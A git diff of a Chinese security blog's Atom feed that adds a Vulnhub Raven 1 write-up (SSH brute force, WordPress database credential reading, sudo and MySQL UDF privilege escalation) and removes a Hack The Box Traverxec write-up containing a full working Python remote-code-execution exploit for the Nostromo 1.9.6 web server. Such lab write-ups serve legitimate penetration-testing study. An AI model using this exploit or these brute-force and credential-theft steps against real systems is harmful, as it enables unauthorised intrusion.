@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://coldwave96.github.io/"/>
-  <updated>2020-05-20T09:11:15.464Z</updated>
+  <updated>2020-05-25T08:25:40.451Z</updated>
   <id>https://coldwave96.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Vulnhub - Raven 1 の Write-Up</title>
+    <link href="https://coldwave96.github.io/2020/05/25/Raven-1/"/>
+    <id>https://coldwave96.github.io/2020/05/25/Raven-1/</id>
+    <published>2020-05-25T06:02:08.000Z</published>
+    <updated>2020-05-25T08:25:40.451Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;<a href="https://www.vulnhub.com/" target="_blank" rel="noopener">Vulnhub</a>之Raven系列靶机第一台<a href="https://www.vulnhub.com/entry/raven-1,256/" target="_blank" rel="noopener">Raven 1</a>的Write-up。</p><a id="more"></a><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>&emsp;&emsp;寻找靶机地址：</p><p><img src="/img/Raven-1/Raven-1-1.png" alt=""></p><p>&emsp;&emsp;扫描开放的端口和服务：</p><p><img src="/img/Raven-1/Raven-1-2.png" alt=""></p><p>&emsp;&emsp;首先看下80端口的服务，打开后是Raven Security公司的网站，浏览下网站，在SERVICE界面的源码中找到flag1：</p><p><img src="/img/Raven-1/Raven-1-3.png" alt=""></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>&emsp;&emsp;在BLOG界面，发现是一个wordpress搭建的站点，后台数据库为MySQL：</p><p><img src="/img/Raven-1/Raven-1-4.png" alt=""></p><p>&emsp;&emsp;根据经验这里肯定是有问题的，用wpscan扫一下看看能发现什么：</p><p><img src="/img/Raven-1/Raven-1-5.png" alt=""></p><p>&emsp;&emsp;然而并没有得到什么有用的信息，不甘心，再尝试爆破一下用户信息：</p><p><img src="/img/Raven-1/Raven-1-6.png" alt=""></p><p>&emsp;&emsp;找到两个用户steven和michael，尝试爆破这两个账户的密码无果。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>&emsp;&emsp;在wordpress这里尝试了很久也没有任何收获，只能转向22端口。</p><p>&emsp;&emsp;尝试下steven和michael两个用户爆破22端口：</p><p><img src="/img/Raven-1/Raven-1-7.png" alt=""></p><p>&emsp;&emsp;找到一个，接下来ssh登录一下，找找有什么信息。</p><p><img src="/img/Raven-1/Raven-1-8.png" alt=""></p><p>&emsp;&emsp;登录后提示我们有新的邮件，去找一下这个邮件在哪里：</p><p><img src="/img/Raven-1/Raven-1-9.png" alt=""></p><p>&emsp;&emsp;然后看一下michael这封邮件内容，有一个比较有趣的片段：</p><p><img src="/img/Raven-1/Raven-1-10.png" alt=""></p><p>&emsp;&emsp;但是并不明白这有什么用。同时在/var/www目录下找到flag2.txt文件：</p><p><img src="/img/Raven-1/Raven-1-11.png" alt=""></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>&emsp;&emsp;在查看wordpress网站的配置文件时，找到数据库的账户和密码，之前Wappalyzer也说明网站后台是MySQL数据库：</p><p><img src="/img/Raven-1/Raven-1-12.png" alt=""></p><p>&emsp;&emsp;连接MySQL数据库：</p><p><img src="/img/Raven-1/Raven-1-13.png" alt=""></p><p><img src="/img/Raven-1/Raven-1-14.png" alt=""></p><p>&emsp;&emsp;wp_users表里应该是用户的账户密码，看一下有什么：</p><p><img src="/img/Raven-1/Raven-1-15.png" alt=""></p><p>&emsp;&emsp;果然是Steven和Michael两个用户，Michael用户的密码查不出来，Steven账户密码解密结果：</p><p><img src="/img/Raven-1/Raven-1-16.png" alt=""></p><p>&emsp;&emsp;再依次看一下其他的表，在wp_posts表里发现flag3和flag4：</p><p><img src="/img/Raven-1/Raven-1-17.png" alt=""></p><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>&emsp;&emsp;到这所有的flag我们都已经拿到了，但是还希望可以获得root权限。</p><p>&emsp;&emsp;虽然在数据库里获得的是wordpress后台账户的密码，但还是尝试一下ssh是否有用：</p><p><img src="/img/Raven-1/Raven-1-18.png" alt=""></p><p>&emsp;&emsp;幸运地登录了steven账户，看一下sudo有什么权限：</p><p><img src="/img/Raven-1/Raven-1-19.png" alt=""></p><p>&emsp;&emsp;那么就可以通过python提权了，具体可看之前DC系列靶机的writeups中python建立交互式终端：</p><p><img src="/img/Raven-1/Raven-1-20.png" alt=""></p><p>&emsp;&emsp;提权成功，获取root权限后拿到一切（原来flag4应该这样拿==）：</p><p><img src="/img/Raven-1/Raven-1-21.png" alt=""></p><h2 id="P-S"><a href="#P-S" class="headerlink" title="P.S."></a>P.S.</h2><p>&emsp;&emsp;靶机介绍里也说了这台靶机提权的方法有至少两种，后来看其他Writeup发现还可以通过MySQL的udf提权实现。关于udf提权在<a href="https://coldwave96.github.io/2020/05/01/JarvisOJ-WEB-2/#RE">JarvisOJ Web RE？题</a>里有涉及到。</p><p>&emsp;&emsp;这台靶机udf提权首先找一下payload：</p><p><img src="/img/Raven-1/Raven-1-22.png" alt=""></p><p>&emsp;&emsp;然后在本地编译好1518.c文件：</p><p><img src="/img/Raven-1/Raven-1-23.png" alt=""></p><p>&emsp;&emsp;将编译好的1518.so文件上传到靶机上：</p><p><img src="/img/Raven-1/Raven-1-24.png" alt=""></p><p>&emsp;&emsp;然后回到michael账户连接数据库开始提权：</p><p><img src="/img/Raven-1/Raven-1-25.png" alt=""></p><p><img src="/img/Raven-1/Raven-1-26.png" alt=""></p><p><img src="/img/Raven-1/Raven-1-27.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;&lt;a href=&quot;https://www.vulnhub.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Vulnhub&lt;/a&gt;之Raven系列靶机第一台&lt;a href=&quot;https://www.vulnhub.com/entry/raven-1,256/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Raven 1&lt;/a&gt;的Write-up。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
+    
+    
+      <category term="Vulnhub" scheme="https://coldwave96.github.io/tags/Vulnhub/"/>
+    
+  </entry>
   
   <entry>
     <title>XMAN level3 の Write-Up</title>
@@ -452,31 +475,6 @@
     
       &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;元旦这两天闲来无事玩了下&lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/215&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Postman&lt;/a&gt;这台靶机，这是一台有很多坑的机器，不过总体难度不高。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/img/Postman/Postman1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
-    
-    
-      <category term="Hack The Box" scheme="https://coldwave96.github.io/tags/Hack-The-Box/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Hack The Box - Traverxec の Write-Up</title>
-    <link href="https://coldwave96.github.io/2019/12/17/Traverxec/"/>
-    <id>https://coldwave96.github.io/2019/12/17/Traverxec/</id>
-    <published>2019-12-17T08:15:47.000Z</published>
-    <updated>2020-04-30T10:46:05.015Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;Hack The Box是一个非常完备的渗透测试训练靶场，比较接近于实战，许多机器存在不小的难度。不过美中不足的一是会员价格太贵，二是需要通过VPN接入实验网络，然而国内连接实在是有点慢，特别是晚上网络高峰期，各种连接失败不在话下。</p><p>&emsp;&emsp;这两天玩了<a href="https://www.hackthebox.eu/home/machines/profile/217" target="_blank" rel="noopener">Traverxec</a>这台靶机，相较而言是一个很简单的机器了，但是也学到了不少东西。</p><p><img src="/img/Traverxec/Traverxec1.png" alt=""></p><a id="more"></a><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>&emsp;&emsp;第一步当然是常规的Nmap扫描：</p><p><img src="/img/Traverxec/Traverxec2.png" alt=""></p><p>&emsp;&emsp;可以看到靶机只开放了22和80两个端口。</p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>&emsp;&emsp;从Nmap扫描结果来看80端口开放的是Nostromo 1.9.6服务，网站页面本身并不能找到什么可以利用的漏洞。</p><p><img src="/img/Traverxec/Traverxec3.png" alt=""></p><p>&emsp;&emsp;emmm，David是个信息点。</p><p>&emsp;&emsp;Web界面上找不到什么好玩的东西了，既然我们有了Nostromo的具体版本号，那就去搜索一下有没有可以利用的漏洞：</p><p><img src="/img/Traverxec/Traverxec4.png" alt=""></p><p>&emsp;&emsp;不搜不知道，一搜吓一跳，第一条就是最喜欢的远程命令执行漏洞。下面给出EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">'RCE in Nostromo web server through 1.9.6 due to path traversal.'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'host'</span>,help=<span class="string">'domain/IP of the Nostromo web server'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'port'</span>,help=<span class="string">'port number'</span>,type=int)</span><br><span class="line">parser.add_argument(<span class="string">'cmd'</span>,help=<span class="string">'command to execute, default is id'</span>,default=<span class="string">'id'</span>,nargs=<span class="string">'?'</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(s)</span>:</span></span><br><span class="line">r=<span class="string">''</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">t=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> len(t)==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">r+=t</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(host,port,cmd)</span>:</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.settimeout(<span class="number">1</span>)</span><br><span class="line">s.connect((host,int(port)))</span><br><span class="line">payload=<span class="string">"""POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n&#123;&#125; 2&gt;&amp;1"""</span>.format(cmd)</span><br><span class="line">s.send(payload)</span><br><span class="line">r=recv(s)</span><br><span class="line">r=r[r.index(<span class="string">'\r\n\r\n'</span>)+<span class="number">4</span>:]</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line"></span><br><span class="line">exploit(args.host,args.port,args.cmd)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;运行脚本即可获得反弹shell：</p><p><img src="/img/Traverxec/Traverxec5.png" alt=""></p><p><img src="/img/Traverxec/Traverxec6.png" alt=""></p><p>&emsp;&emsp;显然得到的是一个非交互shell，通过熟悉的命令可得到交互式shell，不熟悉的可以去看我之前DC系列靶机的Write-Ups。</p><h2 id="突破"><a href="#突破" class="headerlink" title="突破"></a>突破</h2><p>&emsp;&emsp;此时在目录下可以找到Nostromo服务的配置文件：</p><p><img src="/img/Traverxec/Traverxec7.png" alt=""></p><p>&emsp;&emsp;在配置文件中发现存在Public文件夹public_www。但是尝试进入/home/david文件夹后提示权限禁止。</p><p><img src="/img/Traverxec/Traverxec8.png" alt=""></p><p>&emsp;&emsp;于是不管这一层，直接进入public_www文件夹：</p><p><img src="/img/Traverxec/Traverxec9.png" alt=""></p><p>&emsp;&emsp;果然在这个文件夹里发现了好东西，看名字就是ssh的登录凭证，后面的思路一下就有了。但是有个问题，怎么把这个文件下载到本地呢？</p><p><img src="/img/Traverxec/Traverxec10.png" alt=""></p><p><img src="/img/Traverxec/Traverxec11.png" alt=""></p><p>&emsp;&emsp;巧妙的通过base方法即可实现该文件的下载，快拿小本本记一下。解压这个文件，果然是ssh登录凭证。</p><p><img src="/img/Traverxec/Traverxec12.png" alt=""></p><p>&emsp;&emsp;但是尝试通过这个凭证登录时提示需要使用凭证的密码，这时候只有通过john工具来暴力破解了。<a href="https://blog.csdn.net/qq_40490088/article/details/97812715" target="_blank" rel="noopener">这里</a>对这种方法有详细的解释。</p><p><img src="/img/Traverxec/Traverxec13.png" alt=""></p><p><img src="/img/Traverxec/Traverxec14.png" alt=""></p><p><img src="/img/Traverxec/Traverxec15.png" alt=""></p><p>&emsp;&emsp;这样我们就得到了ssh凭证的密码：hunter。结合Web页面得到的david信息点，我们通过ssh登录靶机：</p><p><img src="/img/Traverxec/Traverxec16.png" alt=""></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>&emsp;&emsp;我们已经以david的身份登录了靶机，下一步就是尝试提权获取靶机root权限。在当前文件夹下发现一个奇怪的目录bin，进去之后看到一个服务的脚本，好奇心促使我看了一眼：</p><p><img src="/img/Traverxec/Traverxec17.png" alt=""></p><p>&emsp;&emsp;果然有猫腻，这个服务居然有root权限。ok，轻松提权：</p><p><img src="/img/Traverxec/Traverxec18.png" alt=""></p><p>&emsp;&emsp;至此，这个靶机算是完全被我们掌控。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;Hack The Box是一个非常完备的渗透测试训练靶场，比较接近于实战，许多机器存在不小的难度。不过美中不足的一是会员价格太贵，二是需要通过VPN接入实验网络，然而国内连接实在是有点慢，特别是晚上网络高峰期，各种连接失败不在话下。&lt;/p&gt;
-&lt;p&gt;&amp;emsp;&amp;emsp;这两天玩了&lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/217&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Traverxec&lt;/a&gt;这台靶机，相较而言是一个很简单的机器了，但是也学到了不少东西。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/img/Traverxec/Traverxec1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
     
     </summary>
     
